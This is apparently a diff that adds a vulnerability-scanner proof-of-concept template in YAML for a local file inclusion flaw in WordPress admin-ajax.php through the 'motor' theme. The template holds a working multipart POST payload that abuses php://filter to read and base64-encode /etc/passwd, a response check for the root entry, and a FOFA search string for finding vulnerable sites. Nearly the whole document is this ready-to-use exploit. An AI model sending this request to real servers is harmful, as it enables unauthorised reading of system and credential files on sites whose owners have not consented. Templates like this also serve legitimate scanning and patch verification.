@@ -1,0 +1,33 @@
+id: poc-yaml-wordpress-admin-ajax-phpfilter-fileread
+info:
+  name: wordpress admin-ajax.php 文件包含漏洞
+  severity: high
+  tags:
+  - lfi
+  finger: wordpress
+  fofa: body="wp-content/themes/motor"
+requests:
+- method: POST
+  path: /wp-admin/admin-ajax.php
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0HCPrcv8camxolzm
+  data: '------WebKitFormBoundary0HCPrcv8camxolzm
+
+    Content-Disposition: form-data; name="action"
+
+
+    motor_load_more
+
+    ------WebKitFormBoundary0HCPrcv8camxolzm
+
+    Content-Disposition: form-data; name="file"
+
+
+    php://filter/convert.base64-encode/resource=/etc/passwd
+
+    ------WebKitFormBoundary0HCPrcv8camxolzm--
+
+    '
+  expression: status_code == 200 && matches(base64_decode(body),"root:.*:0:0:")
+variables: {}
+transport: http
